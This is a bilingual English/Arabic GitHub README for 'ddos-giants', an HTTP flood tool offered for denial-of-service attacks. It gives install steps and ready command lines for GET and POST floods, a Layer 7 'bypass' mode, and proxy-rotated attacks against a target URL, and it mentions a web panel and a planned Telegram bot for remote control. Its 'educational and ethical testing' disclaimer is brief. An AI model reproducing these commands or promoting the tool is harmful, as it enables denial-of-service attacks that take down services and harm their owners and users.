# 🚀 ddos-giants | العملاق للاختبار الأمني DDoS

**ddos-giants** is a professional open-source tool for Distributed Denial of Service (DDoS) attacks for **educational and ethical testing** purposes only.  
تم تطوير الأداة بالكامل بواسطة [خالد](https://github.com/nnnzjn-1)، وتتميز بالذكاء، وسهولة التحكم، ودعم الهجمات الحديثة.

---
## Table of Contents | محتويات

- [About | عن المشروع](#about--عن-المشروع)  
- [Features | المميزات](#features--المميزات)  
- [Installation | التثبيت](#installation--التثبيت)  
- [Usage | طريقة الاستخدام](#usage--طريقة-الاستخدام)  
- [Attack Modes | أوضاع الهجوم](#attack-modes--أوضاع-الهجوم)  
- [Examples | أمثلة](#examples--أمثلة)  
- [Configuration | الإعدادات](#configuration--الإعدادات)  
- [Code Structure & Development | هيكلة الكود والتطوير](#code-structure--development--هيكلة-الكود-والتطوير)  
- [Testing | الاختبارات](#testing--الاختبارات)    
- [Disclaimer | إخلاء المسؤولية](#disclaimer--إخلاء-المسؤولية)  
- [Author | المؤلف](#author--المؤلف) 

---

## Features | المميزات

- Multiple attack modes (GET, POST, bypass, proxy-based)  
- دعم أوضاع هجوم متعددة (GET، POST، تجاوز الحماية، باستخدام البروكسي)  
- Proxy support (HTTP and SOCKS5)  
- دعم البروكسيات HTTP و SOCKS5  
- Custom POST data support  
- إمكانية إرسال بيانات POST مخصصة  
- High concurrency with efficient async HTTP requests  
- تعدد الخيوط بكفاءة باستخدام الشبكات غير المتزامنة  
- User-friendly CLI interface  
- واجهة سطر أوامر سهلة الاستخدام  
- Modular code design for easy maintenance  
- تصميم برمجي مرن وسهل الصيانة  
- Basic unit tests to ensure stability  
- اختبارات وحدة أساسية لضمان الاستقرار  



--- 

## Installation | التثبيت

Requirements:

- Python 3.8 or newer  
- مكتبة `aiohttp` و `async-timeout`

Install dependencies:

```bash
pip install -r requirements.txt

---

## 🛠️ Installation | التثبيت

```bash
# Update system & install essentials | تحديث النظام
apt update && apt install -y git python3 python3-pip

# Clone the project | استنساخ المشروع
git clone https://github.com/nnnzjn-1/ddos-giants.git
cd ddos-giants

# Install Python libraries | تثبيت المكتبات
pip3 install -r requirements.txt
```

---

## Usage | طريقة التشغيل

### Available Attack Modes | أوضاع الهجوم المتاحة:

| Mode        | Description (EN)                       | الوصف (عربي)                             |
|-------------|--------------------------------------|-----------------------------------------|
| GET         | Simple GET attack without proxy      | هجوم GET بسيط بدون استخدام بروكسي      |
| POST        | POST attack without proxy with data  | هجوم POST بدون بروكسي مع بيانات         |
| bypass      | Layer 7 bypass attack with proxies   | هجوم تجاوز طبقة 7 باستخدام البروكسي     |
| proxy_get   | GET attack with proxies               | هجوم GET باستخدام البروكسيات             |
| proxy_post  | POST attack with proxies and data    | هجوم POST باستخدام البروكسيات مع بيانات  |

---

### Usage Examples | أمثلة التشغيل:

```bash
# Simple GET attack for 60 seconds with 100 threads
python3 core/runner.py GET https://example.com 60 100

# POST attack for 60 seconds with 100 threads and POST data
python3 core/runner.py POST https://example.com 60 100 "" "param1=value1&param2=value2"

# Bypass attack with 60 seconds, 100 threads, using SOCKS5 proxies file
python3 core/runner.py bypass https://example.com 60 100 proxy/socks5.txt

# GET attack with 60 seconds, 100 threads, using HTTP proxies file
python3 core/runner.py proxy_get https://example.com 60 100 proxy/http.txt

# POST attack with 60 seconds, 100 threads, using HTTP proxies file and POST data
python3 core/runner.py proxy_post https://example.com 60 100 proxy/http.txt "param1=value1&param2=value2"
```

----
## Configuration | الإعدادات
---
	•	Proxy files: One proxy per line in format ip:port
	•	ملفات البروكسي: بروكسي واحد في كل سطر بالشكل ip:port
	•	POST data: Must be URL-encoded, e.g., key=value&key2=value2
	•	بيانات POST: مشفرة بصيغة URL مثل key=value&key2=value2
----

## Code Structure & Development | هيكلة الكود والتطوير
---
```ddos-giants/
│
├── core/                # Attack core logic files
│   ├── runner.py        # Main entry point
│   ├── attacks.py       # Attack methods implementation
│   └── utils.py         # Utility functions (e.g., proxy loader)
│
├── proxy/               # Proxy lists directory
│   ├── socks5.txt
│   └── http.txt
│
├── tests/                # Unit tests directory
│   └── test_runner.py
│
├── README.md              # This documentation file
├── requirements.txt       # Dependencies list
└── .gitignore
```
---
## Development notes | ملاحظات تطويرية
---
	•	Use type hints to improve readability and allow static checking (mypy).
	•	استخدم نوع البيانات (type hints) لتحسين وضوح الكود.
	•	Add detailed docstrings to all functions and classes.
	•	أضف تعليقات docstrings لكل دالة وكلاس.
	•	Implement logging module instead of print for better debugging control.
	•	استبدل print بـ logging لتسهيل تتبع الأخطاء.
	•	Consider splitting configuration values (e.g., headers, user agents) into separate config files.
	•	افصل إعدادات مثل الهيدرز وقوائم المستخدمين في ملفات مستقلة.

--- 
## Testing | الاختبارات
-
Basic unit tests are included in the tests/ folder to verify:

 •	URL validation
 •	Proxy loading functionality
 •	Attack mode execution without crashing

Running tests | تشغيل الاختبارات
 •python3 -m unittest discover tests

---
 ## 🌍 Web Interface  | واجهة الويب 

```bash
uvicorn web.app:app --host 0.0.0.0 --port 8000 --reload
```
Then open:  
ثم افتح: `http://localhost:8000`

---

## 🤖 Telegram Bot (soon) | بوت تيليجرام (قريبًا)

Remotely control and monitor attacks via Telegram.  
تحكم عن بعد واستلم الإشعارات عبر تيليجرام.

---

Notes | ملاحظات:
-
	•	For proxy modes (bypass, proxy_get, proxy_post), you must provide a proxy file containing proxies list.
	•	في أوضاع البروكسي، يجب توفير ملف يحتوي على قائمة البروكسيات.
	•	POST data should be URL encoded (e.g. param1=value1&param2=value2).
	•	بيانات POST يجب أن تكون مشفرة بصيغة URL.


## ⚠️ Legal Warning | ⚠️ تحذير قانوني

This tool is for **ethical testing and education only** with explicit permission from the system owner.  
هذه الأداة لأغراض اختبارية وتعليمية شرعية فقط، ويُمنع استخدامها ضد أي جهة دون إذن.

---

## 🧾 License | الترخيص

MIT License  
Developed by **Khaled** – [GitHub: nnnzjn-1](https://github.com/nnnzjn-1)
